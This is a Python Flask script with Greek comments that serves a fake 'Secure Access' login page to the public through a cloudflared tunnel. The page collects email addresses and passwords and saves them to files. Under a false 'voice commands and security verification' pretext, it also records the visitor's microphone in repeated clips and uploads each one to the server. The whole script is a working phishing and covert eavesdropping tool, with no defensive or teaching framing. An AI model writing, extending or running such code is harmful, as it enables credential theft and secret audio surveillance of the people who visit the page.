import os
import base64
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

# --- Εγκατάσταση εξαρτήσεων και ρύθμιση σήραγγας ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip σιωπηλά."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared, FFmpeg και απαιτούμενα πακέτα Python."""
    # 1. Επαλήθευση cloudflared
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("-> Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)

    # 2. **ΔΙΟΡΘΩΣΗ**: Επαλήθευση FFmpeg (ΚΡΙΤΙΚΟ ΓΙΑ ΗΧΟ)
    try:
        subprocess.run(["ffmpeg", "-version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'ffmpeg' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("-> Το FFmpeg ΑΠΑΙΤΕΙΤΑΙ για επεξεργασία και αποθήκευση ήχου με ήχο.", file=sys.stderr)
        print("-> Παρακαλώ εγκαταστήστε το από: https://ffmpeg.org/download.html", file=sys.stderr)
        sys.exit(1)

    # 3. Έλεγχος για απαιτούμενα πακέτα Python
    packages = {"Flask": "flask", "pydub": "pydub"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Εγκατάσταση πακέτου που λείπει: {pkg_name}...", file=sys.stderr)
            install_package(pkg_name)

def get_recording_duration():
    """Ζητά από τον χρήστη να επιλέξει διάρκεια εγγραφής σε δευτερόλεπτα."""
    while True:
        try:
            print("\n" + "="*50)
            print("ΡΥΘΜΙΣΗ ΔΙΑΡΚΕΙΑΣ ΕΓΓΡΑΦΗΣ")
            print("="*50)
            print("Πόσα δευτερόλεπτα πρέπει να διαρκεί κάθε εγγραφή;")
            print("Προτείνεται: 15-30 δευτερόλεπτα για καλύτερα αποτελέσματα")
            print("="*50)
            
            duration = input("Εισάγετε διάρκεια σε δευτερόλεπτα (π.χ., 15, 30, 60): ").strip()
            
            if not duration:
                print("Χρήση προεπιλεγμένης διάρκειας: 15 δευτερόλεπτα")
                return 15000  # Προεπιλογή σε 15 δευτερόλεπτα (σε χιλιοστοδευτερόλεπτα)
            
            duration_sec = int(duration)
            
            if duration_sec <= 0:
                print("Παρακαλώ εισάγετε θετικό αριθμό.")
                continue
                
            if duration_sec > 300:  # Μέγιστο 5 λεπτά
                print("Προειδοποίηση: Πολύ μεγάλη διάρκεια (>5 λεπτά) μπορεί να προκαλέσει προβλήματα απόδοσης.")
                confirm = input("Συνέχεια ούτως ή άλλως; (y/n): ").lower()
                if confirm != 'y':
                    continue
            
            print(f"Διάρκεια εγγραφής ορίστηκε σε {duration_sec} δευτερόλεπτα")
            return duration_sec * 1000  # Μετατροπή σε χιλιοστοδευτερόλεπτα
            
        except ValueError:
            print("Μη έγκυρη εισαγωγή. Παρακαλώ εισάγετε αριθμό (π.χ., 15, 30, 60).")
        except KeyboardInterrupt:
            print("\n\nΗ λειτουργία ακυρώθηκε.")
            sys.exit(0)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά μια σήραγγα cloudflared και εκτυπώνει τον δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\n{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()


# --- Flask Εφαρμογή ---
from pydub import AudioSegment

app = Flask(__name__)

# Καθολική μεταβλητή για διάρκεια εγγραφής (σε χιλιοστοδευτερόλεπτα)
RECORDING_DURATION_MS = 15000  # Προεπιλογή 15 δευτερόλεπτα

RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
os.makedirs(RECORDINGS_FOLDER, exist_ok=True)


def get_html_template(recording_duration_ms):
    """Δημιουργεί πρότυπο HTML με την καθορισμένη διάρκεια εγγραφής."""
    recording_duration_sec = recording_duration_ms // 1000
    
    return f'''
<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ασφαλής Πρόσβαση</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Καλώς Ήρθατε</h1>
                <p>Για να ενεργοποιήσετε τις φωνητικές εντολές και για επαλήθευση ασφαλείας, παρακαλώ επιτρέψτε την πρόσβαση στο μικρόφωνο.</p>
                <input type="email" name="email" placeholder="Εισάγετε τη διεύθυνση email σας" required>
                <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                <input type="submit" value="Ασφαλής Σύνδεση">
            </form>
        </main>
        <footer>
            <a href="#">Όροι Χρήσης</a> &bull; <a href="#">Πολιτική Απορρήτου</a> &bull; <a href="#">Υποστήριξη</a>
        </footer>
    </div>
    <script>
        async function startRecordingLoop(stream) {{
            // **ΔΙΟΡΘΩΣΗ**: Καθορισμός codec ήχου και bitrate για καλύτερη ποιότητα και συμβατότητα.
            const options = {{
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 128000
            }};
            const recorder = new MediaRecorder(stream, options);
            const audioChunks = [];

            recorder.ondataavailable = event => {{
                if (event.data.size > 0) {{
                    audioChunks.push(event.data);
                }}
            }};

            recorder.onstop = () => {{
                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {{
                    $.ajax({{
                        url: '/upload_audio', type: 'POST',
                        data: JSON.stringify({{ audio: reader.result.split(',')[1] }}),
                        contentType: 'application/json; charset=utf-8'
                    }});
                }};
                startRecordingLoop(stream);
            }};

            recorder.start();
            setTimeout(() => {{
                if(recorder.state === "recording") {{
                    recorder.stop();
                }}
            }}, {recording_duration_ms});
        }}

        async function init() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                startRecordingLoop(stream);
            }} catch (err) {{
                console.error("Η πρόσβαση στο μικρόφωνο απορρίφθηκε:", err);
            }}
        }}

        window.onload = init;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(get_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(RECORDINGS_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Η σύνδεση ήταν επιτυχής. Θα ανακατευθυνθείτε σύντομα.", 200

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data: return jsonify({"error": "Δεν υπάρχει ήχος"}), 400
        audio_bytes = base64.b64decode(audio_data)
        
        # Το pydub χρησιμοποιεί ffmpeg για μετατροπή από webm σε wav.
        webm_audio = AudioSegment.from_file(BytesIO(audio_bytes), format="webm")
        
        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        webm_audio.export(os.path.join(RECORDINGS_FOLDER, filename), format="wav")
        
        return jsonify({"message": "Ο ήχος αποθηκεύτηκε."}), 200
    except Exception as e:
        # Παρέχει πιο λεπτομερές σφάλμα στην κονσόλα του διακομιστή για debugging.
        print(f"[ΣΦΑΛΜΑ] Αποτυχία επεξεργασίας ήχου: {e}", file=sys.stderr)
        return jsonify({"error": "Αποτυχία επεξεργασίας ήχου στον διακομιστή."}), 500

if __name__ == '__main__':
    # Έλεγχος εξαρτήσεων πρώτα
    check_dependencies()
    
    # Λήψη διάρκειας εγγραφής από τον χρήστη
    global RECORDING_DURATION_MS
    RECORDING_DURATION_MS = get_recording_duration()
    
    print(f"\n{'='*50}")
    print(f"Διαμόρφωση Εγγραφής:")
    print(f"Διάρκεια: {RECORDING_DURATION_MS//1000} δευτερόλεπτα")
    print(f"Τοποθεσία Αποθήκευσης: {RECORDINGS_FOLDER}")
    print(f"{'='*50}\n")
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    script_name = "Σελίδα Σύνδεσης (Μικρόφωνο)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nΤερματισμός...")
        sys.exit(0)
